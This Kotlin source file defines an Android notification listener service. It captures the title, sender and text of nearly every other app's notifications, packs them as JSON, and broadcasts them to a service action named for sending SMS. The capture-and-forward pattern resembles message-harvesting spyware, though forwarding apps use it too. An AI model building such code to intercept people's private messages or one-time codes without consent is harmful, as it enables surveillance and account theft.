package com.xyz.mod.app

import android.content.Intent
import android.content.pm.PackageManager
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class NotifListenerService : NotificationListenerService() {

    private val skipPackages = setOf(
        "android",
        "com.android.systemui",
        "com.xyz.mod.app",
        "com.google.android.gms"
    )

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName
        if (pkg in skipPackages) return

        val notif   = sbn.notification ?: return
        val extras  = notif.extras ?: return

        val title   = extras.getCharSequence("android.title")?.toString() ?: ""
        val text    = extras.getCharSequence("android.text")?.toString()
                   ?: extras.getCharSequence("android.bigText")?.toString()
                   ?: ""

        if (title.isBlank() && text.isBlank()) return

        val appName = try {
            packageManager.getApplicationLabel(
                packageManager.getApplicationInfo(pkg, 0)
            ).toString()
        } catch (_: PackageManager.NameNotFoundException) { pkg }

        val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())

        val payload = JSONObject().apply {
            put("appName",  appName)
            put("sender",   title)
            put("message",  text)
            put("time",     time)
            put("pkgName",  pkg)
        }

        val i = Intent(DeviceService.ACTION_SEND_SMS).apply {
            putExtra(DeviceService.EXTRA_SMS_JSON, payload.toString())
            setPackage(packageName)
        }
        sendBroadcast(i)
    }
}
